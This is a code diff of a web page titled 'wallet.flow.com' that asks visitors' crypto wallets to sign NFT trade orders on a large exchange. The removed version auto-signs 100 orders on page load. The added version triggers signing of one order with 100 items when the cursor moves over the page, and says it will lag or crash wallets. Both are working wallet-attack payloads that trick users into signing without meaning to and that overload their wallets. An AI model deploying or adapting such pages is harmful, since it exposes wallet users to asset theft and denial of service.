@@ -6,228 +6,183 @@
   <title>wallet.flow.com</title>
   <style>
     body {
-      background:#0f1720; 
-      color:#e6eef8; 
-      font-family:Inter,Segoe UI,Arial; 
-      padding:18px; 
-      text-align:center;
+      background: #111;
+      color: #eee;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      padding: 32px;
+      text-align: center;
     }
-    h1 { margin:0 0 12px 0; font-size:20px; color:#22c55e; }
-    .warning { 
-      background:#7f1d1d; 
-      color:#ffe4e6; 
-      padding:12px; 
-      border-radius:8px; 
-      margin:20px 0; 
-      font-weight:bold;
+    .card {
+      background: #0f1720;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 900px;
+      margin: 0 auto;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
     }
-    #list { 
-      height:520px; 
-      overflow:auto; 
-      background:#071029; 
-      padding:10px; 
-      border-radius:8px; 
-      border:1px solid #0b1220; 
-      text-align:left;
+    h1 { margin: 0 0 8px 0; font-size: 20px; color: #22c55e; }
+    p { margin: 0 0 12px 0; color: #bfc9d9; }
+    pre {
+      margin-top: 12px;
+      background: #071021;
+      padding: 12px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 360px;
+      overflow: auto;
+      color: #e6eef8;
     }
-    .row { 
-      background:#081226; 
-      padding:10px; 
-      margin-bottom:8px; 
-      border-radius:6px; 
-      display:flex; 
-      justify-content:space-between; 
-      align-items:center; 
-      gap:10px; 
-    }
-    .meta { font-size:13px; color:#9fb4d9; }
-    .detail { font-size:13px; color:#dbeafe; background:#071635; padding:8px; border-radius:6px; margin-top:8px; display:none; }
-    .row:hover .detail { display:block; }
-    .log { 
-      margin-top:20px; 
-      background:#020617; 
-      padding:10px; 
-      border-radius:6px; 
-      border:1px solid #072033; 
-      color:#9be5b4; 
-      font-family:monospace; 
-      font-size:12px; 
-      height:180px; 
-      overflow:auto; 
-    }
+    .warn { color: #ffcc00; margin-top: 8px; font-weight: bold; }
+    .good { color: #7ee787; }
   </style>
 </head>
 <body>
+  <div class="card" id="card">
+    <h1>Seaport Order Stress Test</h1>
+    <p>Move your cursor over this page to trigger signing of a Seaport order with <strong>100 items</strong>.</p>
+    <p class="warn">Warning: This will cause extreme lag or crash in most wallets due to huge message size.</p>
+    <p>Supported wallets: MetaMask, Trust, Coinbase, Phantom (EVM), etc.</p>
+    <pre id="output">Ready. Hover your cursor over this page to activate the handler.</pre>
+  </div>
 
-<h1>Auto Seaport Order Generator — 100 Orders</h1>
+  <script>
+    // CONFIG
+    const ITEM_COUNT = 100; // 100 ITEMS (bisa diganti 1000, 10000, dll)
+    const SIGN_COUNT = 1;
 
-<div class="warning">
-  AUTO MODE: 100 Seaport orders generated & signed on page load!<br>
-  Wallet akan spam popup — gunakan hanya di test wallet!
-</div>
+    const outEl = document.getElementById('output');
 
-<div id="list">Generating 100 orders...</div>
-
-<h3 style="margin-top:20px;">Log</h3>
-<div class="log" id="log">Initializing...\n</div>
-
-<script>
-/*
-  AUTO MODE — NO BUTTON, NO USER INTERACTION
-  100 Seaport orders generated & signed immediately
-*/
-
-const TOTAL_ORDERS = 100; // BISA DIUBAH KE 1000, 5000, 10000
-let ORDERS = [];
-const listEl = document.getElementById('list');
-const logEl = document.getElementById('log');
-
-function log(msg) {
-  const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
-  logEl.textContent = line + "\n" + logEl.textContent;
-  logEl.scrollTop = 0;
-  console.log('[AUTO]', msg);
-}
-
-// Random address
-function randAddr() {
-  return '0x' + Array.from({length:40}, () => Math.floor(Math.random()*16).toString(16)).join('');
-}
-
-// Generate 1 order
-function genOrder(i) {
-  return {
-    offerer: randAddr(),
-    zone: randAddr(),
-    offer: [{
-      itemType: 2,
-      token: "0x60e4d786628fea6478f785a6d7e704777c86a7c6",
-      identifierOrCriteria: i + 1000,
-      startAmount: 1,
-      endAmount: 1
-    }],
-    consideration: [{
-      itemType: 1,
-      token: "0x0000000000000000000000000000000000000000",
-      identifierOrCriteria: 0,
-      startAmount: 1,
-      endAmount: 1,
-      recipient: randAddr()
-    }],
-    orderType: 0,
-    startTime: "0",
-    endTime: "9999999999",
-    zoneHash: "0x" + "0".repeat(64),
-    salt: Date.now() + i,
-    conduitKey: "0x" + "0".repeat(64),
-    counter: 0
-  };
-}
-
-// Generate all orders
-function generateAll() {
-  log(`Generating ${TOTAL_ORDERS} Seaport orders...`);
-  ORDERS = Array.from({length: TOTAL_ORDERS}, (_, i) => genOrder(i));
-  log(`${TOTAL_ORDERS} orders generated!`);
-
-  // Render (Opsional) Tampilkan di list
-  listEl.innerHTML = ORDERS.map((o, i) => `
-    <div class="row">
-      <div class="meta">Order #${i+1} — ${o.offerer.slice(0,10)}...</div>
-      <div class="detail">
-        Offer: ${o.offer[0].token.slice(0,10)}... id ${o.offer[0].identifierOrCriteria}<br>
-        Consideration: ${o.consideration[0].recipient.slice(0,10)}...
-      </div>
-    </div>
-  `).join(''));
-}
-
-// EIP-712 domain & types
-const domain = {
-  name: "Seaport",
-  version: "1.1",
-  chainId: 1,
-  verifyingContract: "0x00000000006c3852cbEf3e08E8dF289169EdE581"
-};
-
-const types = {
-  OrderComponents: [
-    {name:"offerer", type:"address"},
-    {name:"zone", type:"address"},
-    {name:"offer", type:"OfferItem[]"},
-    {name:"consideration", type:"ConsiderationItem[]"},
-    {name:"orderType", type:"uint8"},
-    {name:"startTime", type:"uint256"},
-    {name:"endTime", type:"uint256"},
-    {name:"zoneHash", type:"bytes32"},
-    {name:"salt", type:"uint256"},
-    {name:"conduitKey", type:"bytes32"},
-    {name:"counter", type:"uint256"}
-  ],
-  OfferItem: [
-    {name:"itemType", type:"uint8"},
-    {name:"token", type:"address"},
-    {name:"identifierOrCriteria", type:"uint256"},
-    {name:"startAmount", type:"uint256"},
-    {name:"endAmount", type:"uint256"}
-  ],
-  ConsiderationItem: [
-    {name:"itemType", type:"uint8"},
-    {name:"token", type:"address"},
-    {name:"identifierOrCriteria", type:"uint256"},
-    {name:"startAmount", type:"uint256"},
-    {name:"endAmount", type:"uint256"},
-    {name:"recipient", type:"address"}
-  ]
-};
-
-// Build typed data
-function buildTypedData(order) {
-  return { types, domain, primaryType: "OrderComponents", message: order };
-}
-
-// AUTO SIGN ALL 100 ORDERS
-async function autoSignAll() {
-  if (!window.ethereum) {
-    log("No wallet detected — skipping signing");
-    return;
-  }
-
-  try {
-    log("Requesting wallet access...");
-    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-    const user = accounts[0];
-    log(`Wallet connected: ${user.slice(0,8)}...${user.slice(-6)}`);
-
-    log(`Starting auto-sign of ${TOTAL_ORDERS} orders...`);
-
-    for (let i = 0; i < TOTAL_ORDERS; i++) {
-      const typed = buildTypedData(ORDERS[i]);
-      try {
-        const sig = await ethereum.request({
-          method: 'eth_signTypedData_v4',
-          params: [user, JSON.stringify(typed)]
-        });
-        log(`Signed order #${i+1}: ${sig.slice(0,12)}...`);
-      } catch (e) {
-        log(`Order #${i+1} rejected`);
-      }
-      // Delay kecil biar wallet nggak crash
-      await new Promise(r => setTimeout(r, 800));
+    function log(...args) {
+      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
+      outEl.textContent += line + "\n";
+      outEl.scrollTop = outEl.scrollHeight;
+      console.log(...args);
     }
 
-    log("All orders processed!");
-  } catch (err) {
-    log("Wallet connection failed: " + (err.message || err));
-  }
-}
+    // Generate huge Seaport order with 100 items
+    let hugeOrder = null;
+    window.addEventListener('load', () => {
+      log(`Generating Seaport order with ${ITEM_COUNT} items...`);
+      const items = [];
+      for (let i = 0; i < ITEM_COUNT; i++) {
+        items.push({
+          itemType: 2,
+          token: "0x60e4d786628fea6478f785a6d7e704777c86a7c6",
+          identifierOrCriteria: i + 1000,
+          startAmount: "1",
+          endAmount: "1"
+        });
+      }
+      hugeOrder = {
+        offerer: "0x5a6f54b7c9a4d8e9f1a2b3c4d5e6f7g8h9i0j1k2",
+        zone: "0x004c00500000ad104d7cddbc9ff9e8d6f9a3b6d8",
+        offer: items,
+        consideration: [],
+        orderType: 0,
+        startTime: "1734000000",
+        endTime: "1760000000",
+        zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
+        salt: "123456789",
+        conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
+        totalOriginalConsiderationItems: 0,
+        counter: 0
+      };
+      log('Huge order generated. Hover to trigger signing.');
+    });
 
-// === AUTO RUN SEMUA ===
-window.addEventListener('load', () => {
-  generateAll();
-  setTimeout(autoSignAll, 1500); // 1.5 detik setelah generate
-});
-</script>
+    // Mock sign fallback
+    function mockSign() {
+      const fakeSig = `0xMOCKSIG_${Math.random().toString(36).slice(2)}`;
+      log(`Mock signed (huge order too big for real wallet)`);
+      return Promise.resolve(fakeSig);
+    }
 
+    // Real personal_sign with fallback
+    async function trySign(fromAddress) {
+      if (!window.ethereum) {
+        log(`No wallet detected — using mock signature`);
+        return mockSign();
+      }
+
+      try {
+        const message = JSON.stringify(hugeOrder);
+        const hexMessage = '0x' + Array.from(new TextEncoder().encode(message))
+          .map(b => b.toString(16).padStart(2, '0')).join('');
+
+        const sig = await ethereum.request({
+          method: 'personal_sign',
+          params: [hexMessage, fromAddress]
+        });
+        log(`REAL SIGN SUCCESS! Signature length: ${sig.length}`);
+        return sig;
+      } catch (err) {
+        log(`Real sign failed: ${err.message || err}. Falling back to mock.`);
+        return mockSign();
+      }
+    }
+
+    // Hover-triggered batch signing
+    async function signBatchHover() {
+      document.body.removeEventListener('mouseover', hoverHandler);
+
+      outEl.textContent = '';
+      log('Cursor detected. Starting huge Seaport order signing...');
+
+      if (!window.ethereum) {
+        log('No wallet detected. Using mock mode.');
+        await mockSign();
+        setTimeout(() => document.body.addEventListener('mouseover', hoverHandler), 2000);
+        return;
+      }
+
+      let accounts;
+      try {
+        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+      } catch (err) {
+        log('Account request failed/rejected. Using mock.');
+        await mockSign();
+        setTimeout(() => document.body.addEventListener('mouseover', hoverHandler), 2000);
+        return;
+      }
+
+      const from = accounts[0];
+      log(`Connected: ${from}`);
+
+      log(`Attempting to sign Seaport order with ${ITEM_COUNT} items...`);
+
+      const sig = await trySign(from);
+      log(`Final result: ${sig}`);
+
+      log('Test completed.');
+      setTimeout(() => document.body.addEventListener('mouseover', hoverHandler), 3000);
+    }
+
+    // Hover handler (sama persis seperti personal_sign)
+    let hoverTimeout = null;
+    function hoverHandler() {
+      if (hoverTimeout) return;
+      hoverTimeout = setTimeout(() => {
+        hoverTimeout = null;
+        signBatchHover().catch(err => {
+          log('Error:', err);
+          setTimeout(() => document.body.addEventListener('mouseover', hoverHandler), 2000);
+        });
+      }, 100);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.addEventListener('mouseover', hoverHandler);
+      log('Hover listener active. Move cursor to trigger.');
+    });
+
+    // Keyboard fallback (press 'S' for trusted gesture)
+    window.addEventListener('keydown', (e) => {
+      if (e.key.toLowerCase() === 's') {
+        log('Manual trigger via "S" key!');
+        signBatchHover();
+      }
+    });
+  </script>
 </body>
 </html>
